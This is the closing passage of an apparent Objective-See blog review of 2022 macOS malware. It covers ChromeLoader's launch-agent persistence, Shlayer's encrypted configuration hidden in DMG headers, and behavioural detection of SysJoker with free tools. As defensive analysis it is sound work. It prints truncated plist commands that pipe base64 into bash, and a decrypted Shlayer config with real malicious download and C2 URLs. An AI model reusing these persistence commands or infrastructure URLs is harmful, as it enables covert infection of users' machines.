</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>  popUrl<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0&#34;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span><span style="color:#66d9ef">fi</span></span></span></code></pre></div>
<p>In terms of persistence, the macOS variant may install a launch agent.</p>
<blockquote>
  "<i>To maintain persistence, the macOS variation of ChromeLoader will append a preference (plist) file to the /Library/LaunchAgents directory. This ensures that every time a user logs into a graphical session, ChromeLoader‚Äôs Bash script can continually run. </i>" -Red Canary
</blockquote>
<p>The <a href="https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/">CrowdStrike report</a> provides additional details showing that both the Chrome and Safari variants of the malware would persist (as launch agent), with commands embedded directly in the property list:</p>
<pre tabindex="0"><code>//Chrome variant
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;sh&lt;/string&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;string&gt;echo aWYgcHMg -[ SNIP ]- Zmk= | base64 --decode | bash&lt;/string&gt;
&lt;/array&gt;

//Safari variant
&lt;key&gt;ProgramArguments&lt;/key&gt;
&lt;array&gt;
&lt;string&gt;sh&lt;/string&gt;
&lt;string&gt;-c&lt;/string&gt;
&lt;string&gt;echo aW1w -[ SNIP ]- kKQ== | base64 --decode | python  | bash&lt;/string&gt;
&lt;/array&gt;
</code></pre><p>And all this for? Simply, as pointed out by Red Canary, &ldquo;redirecting web traffic through advertising sites&rdquo;.</p>
<p>Writeups:
<br>
¬† &ldquo;<a href="https://redcanary.com/blog/chromeloader/">ChromeLoader: a pushy malvertiser</a>&rdquo;
<br>
<br>
¬† &ldquo;<a href="https://unit42.paloaltonetworks.com/chromeloader-malware/#post-123828-_mpyacggxtibk">ChromeLoader: New Stubborn Malware Campaign</a>&rdquo;<br>
<br>
¬† &ldquo;<a href="https://www.crowdstrike.com/blog/how-crowdstrike-uncovered-a-new-macos-browser-hijacking-campaign/">CrowdStrike Uncovers New MacOS Browser Hijacking Campaign</a>&rdquo;</p>
  </li>
  <br>
  <li> 
<p>üëæ <strong><code>Shlayer (adware)</code></strong>
<br></p>
<p>Shlayer is arguably the most prolific adware targeting macOS. And though it has been well analyzed and its adware-related activities are well understoof, this year it continued to evolve.</p>
<p>In December, security researcher Taha Karim of Confiant <a href="https://objective-see.org/blog/blog_0x70.html">posted a writeup</a> detailing how Shlayer (now) hides its configuration inside Apple proprietary DMG files:</p>
<p><img src="../images/blog/blog_0x70/shlayerDMG_2.webp"  width="100%" class="center" style="border-radius: 4px;">
  
  <center style="color:#787878; padding-top:5px;">Encrypted Shlayer Configuration, Embedded in a DMG Header</center>

<br></p>
<p>When Shlayer is executed, it will first execute a command to list mounted images, including <code>image-path</code> value which contains the path on disk to the parent DMG:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
% hdiutil info -plist | perl -0777pe 's|<data>\\s*(.*?)\\s*</data>|<string>$1</string>|gs' | plutil -convert json -r -o - -- -
{
  "framework" : "628.40.2",
  "images" : [
    {
      "autodiskmount" : true,
      "blockcount" : 8376,
      "blocksize" : 512,
      "diskimages2" : true,
      "hdid-pid" : 88876,
      "image-encrypted" : false,
      "image-path" : <b>"\/Users\/user\/Downloads\/final-cut-pro-x-10-6-1-crack.dmg"</b>,
      "image-type" : "read-only disk image",
      "owner-uid" : 501,
      "removable" : true,
      "system-entities" : [
        {
          "content-hint" : "GUID_partition_scheme",
          "dev-entry" : "\/dev\/disk7"
        },
        {
          "content-hint" : "48465300-0000-11AA-AA11-00306543EBAC",
          "dev-entry" : "\/dev\/disk7s1",
          "mount-point" : "\/Volumes\/Install"
        }
      ],
      "writeable" : false
    }
  ],
  "revision" : "628.40.2",
  "vendor" : "Apple"
}%   
</pre>
</div>
<p>Then Shlayer opens its parent DMG and reads its header, block by block in order to find its embedded configuration information. Once located the configuration data is decrypted:</p>
<img src="../images/blog/blog_0x70/decrypt.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">OSX/Shlayer.F C2 config blob decryption routine</center>

<p>Below is an example of an extracted (decrypted) config from a Shlayer DMG file:
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;du&#34;</span>: <span style="color:#e6db74">&#34;https://s3.amazonaws.com/b30fd539-402f-4/2b88cb8a-6f2c-44/9945647b-15bd-4a/Install.dmg?fn=final-cut-pro-x-10-6-1-crack-license-key-latest-jan-2022&amp;subaff=2874&amp;e=5&amp;k=7288ee87-db3e-4c47-9dc0-00f009e583a0&amp;s=614aa849-d491-4ad4-a7fe-3ff69cb6f316&amp;client=safari&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;lu&#34;</span>: <span style="color:#e6db74">&#34;http://d2hznnx43bsrxg.cloudfront.net/slg?s=%s&amp;c=%i&amp;gs=1&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;bdu&#34;</span>: <span style="color:#e6db74">&#34;http://d2hznnx43bsrxg.cloudfront.net/sd/?c=xGlybQ==&amp;u=%s&amp;s=%s&amp;o=%s&amp;b=15425161967&amp;gs=1&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;upb&#34;</span>: <span style="color:#e6db74">&#34;76916152451219215425161967&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;p&#34;</span>: <span style="color:#e6db74">&#34;nDS8MxD+Tkb54Ocij+4ZMid1lT4f16QCAf/SsI8i+eT0HFx7udZJJTVL/7YETnYwBboycKYxn/WcRdly3ZNwI3lmhMgWobbf7vzy3nUKFhA/PG7wE/TnI7zwmTLlUCMn8ZlR2IhYTgk12+tVwcGfxRP6pjri4Un9Y6b/Pt8/0MGFWY5mSfY7+cRLhnyqLj3EmNoGcuVlV21s6bYZkgmKOAIjbWyQzLLVaw5LBxZK9x4elDe1OKcWdDzNp6Ar+42KYuZPnGlUVa7jUd+5diFSR73wxDIX2TdL+zfcsB4ampVkEUH07Wq8lvlFRKw6SmsJ96ptBR02JD5IgxxhXMaZfHc40E1ZOmxLHltCwpM1yx3aWQA8HUOQedjJnym92q1FDHFixfEgznTOxDZqAjULXPycYXsTkqRxrDqAWhPoSPi5fg3XywrhiytODCbsqbOk9KuryY/FlIdxD97p3V7jIpCi+6fCNegPj08uMmNt7BgrZDGwPoElyiaDEUlbvCc8wIB78QHi9f4GyRUkMmxeuWCLpTl63h+ynkNtPc4PbXe13x0z25s7nZWkPPouEfb8FlxF2LbG1HCXT9nzI9Dt/FHAgANbrAaXUEKmCjBlZnZLahkH2Tua6QaQ7GhV2CnayZctKAEdXMLVAUbpRRKK6lbmjvFGJigfarrNzAg8i3OONoKWA+nlnDE2kJ4Im9JaIjOo9KukCwjxt0fpV7JnvNCMg1IUQj34a41V261i2PvIGDBBIpRlFdKaWw9BFoK5uvG/V3PzHxU6l2E3seuPYFFeQPnHKk4W4ZF6NRRmQLThRVz3RxCKGWM9eMVJNDgbTb7fhFrMBgWLspSo9c7w3Uw1N0GGKMN4U5BFQx64TcXCttAPh8i9T5PQUsLm+mvJpxlWZWKtR0C+uLlQfAqAADGxfqrFlV6ZiEOXjMqdCB4tdvDEWbuEXBr6+yCut+9wNlu3/torf2UcPFR3iMM=&#34;</span>,
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;umu&#34;</span>: <span style="color:#66d9ef">false</span>
</span></span><span style="display:flex;"><span>}</span></span></code></pre></div></p>
<p>Writeup:
<br>
¬† &ldquo;<a href="https://objective-see.org/blog/blog_0x70.html">L‚Äôart de l‚Äô√©vasion: How Shlayer hides its configuration inside Apple proprietary DMG files</a>&rdquo;</p>
  </li>
</ul>
<h3 id="-detections">üõ° Detections</h3>
<p>New malware is notoriously difficult to detect via traditional signature-based approaches &hellip;as, well, it&rsquo;s new! A far better approach is to leverage heuristics or behaviors, that can detect such malware, even with no a priori knowledge of the specific (new) threats.</p>
<p>For example, imagine you open an Office Document that (unbeknownst to you) contains an exploit or malicious macros which installs a persistent backdoor. This is clearly an unusual behavior, that should be detected and alerted upon.</p>
<p>Good news, Objective-See&rsquo;s <a href="https://objective-see.org/tools.html">free open-source macOS security tools</a> do not leverage signatures, but instead monitor for such (unusual, and likely malicious) behaviors.</p>
<p>This allows them to detect and alert on various behaviors of the new malware of 2022 (with no prior knowledge of the malware).</p>
<p>For example, let&rsquo;s look at how <code>SysJoker</code>, the first malware of 2022, was detected by our free tools:</p>
<p>First, <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> detects <code>SysJoker</code>&rsquo;s attempt at persistence (a launch item named <code>com.apple.update.plist</code>):</p>
<img src="../images/blog/blog_0x6C/bb.jpg"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">BlockBlock&#39;s alert</center>

<p><a href="https://objective-see.com/products/lulu.html">LuLu</a>, our free, open-source firewall detects when the malware first attempts to beacon out to grab the encrypted address of it‚Äôs command and control server:</p>
<img src="../images/blog/blog_0x6C/ll.jpg"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">LuLu&#39;s alert</center>

<p>And if you&rsquo;re worried that you are already infected with <code>SysJoker</code>? <a href="https://objective-see.com/products/knockknock.html">KnockKnock</a> can uncover the malware&rsquo;s persistence (after the fact):</p>
<p><img src="../images/blog/blog_0x6C/kk.jpg"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;">KnockKnock&#39;s detection</center>

<br>
<br></p>
<div class="note">
For more information about our free, open-source tools, see:
<br><br>
<center>
  <a class="inlineLink" href="https://objective-see.org/tools.html">Objective-See's Tools</a>.
</center>
</div>
<br>
<br>
<h3 id="-conclusion">üëãüèº Conclusion:</h3>
<p>Well that&rsquo;s a wrap! Thanks for joining our &ldquo;journey&rdquo; as we wandered through the macOS malware of 2022.</p>
<p>With the continued growth and popularity of macOS (especially in the enterprise!), 2023 will surely bring a bevy of new macOS malware.
<br>&hellip;so, stay safe out there!
<br>
<br></p>
<div class="note">
üìö Interested in general Mac malware analysis techniques?
<br>
<table style="border: 0px;">
  <tr>
    <td>
      <img src="../images/blog/blog_0x6B/book.png" height="300px;">
    </td>
    <td style="border: 0px;" width="75%">
    You're in luck, as I've written a book on this topic:
    <br>
  <center>
  <a class="inlineLink" href="https://taomm.org">The Art Of Mac Malware, Vol. 0x1: Analysis</a>
  </center>
  </td>
  </tr>
</table>
</div>
</body>
</html>
</section>

    </div>

    
<script src="/js/cookies.js"></script>
<script src="/social/ss-social.js"></script>
<link href="/social/ss-social.css" rel="stylesheet" />

<script> 
    $(function(){
        
        
        
        if("" == getCookie("acceptedCookies")) 
        {
            document.getElementById("cookies").style.display = "block";
        }

    });
</script>

<script>
function acceptCookies() {

    
    setCookie("acceptedCookies", "yes", 365);

    
    document.getElementById("cookies").style.display = "none";
}
</script>

<br>
<br>
<div id="cookies" class="cookie" style="padding-left:20px;">
    This website uses cookies to improve your experience.
    <div class="cookieButton">
        
        <button class="menuicon button-4" role="button" onclick="acceptCookies()" style="margin-top: 12px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Okay!</button>
    </div>
</div>
<nav role="footer">
<ul>

    <li>
        <a href="mailto:contact@objective-see.com" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#x2709;</span></a>
    </li>

     <li>
        <a href="rss.xml" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xE310;</span></a>
    </li>

    <li>
        <a href="https://www.youtube.com/channel/UCQycc8VDhHuNkZlKSSTDHzw" class="menubutton icon"><span class="ss-icon" style="overflow-y: hidden;">&#xF630;</span></a>
    </li>
   
    <li>
        <a href="https://twitter.com/objective_see" class="menubutton icon"><span class="ss-icon">&#xF611;</span></a>
    </li>
    
    <li>
         <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button" style="margin-top: 7px; float: right; padding:3px; padding-left: 10px; padding-right: 10px;">Support Us!</button>
        </form>
        
    </li>

    <li>
        <div style="margin-top: 10px;">
        Signup for our <a class="inlineLink" target="_blank" href="http://eepurl.com/bXpXeT">newsletter </a> ¬ª
        </div>
    </li>

</ul>
</nav>

  </body>

</html>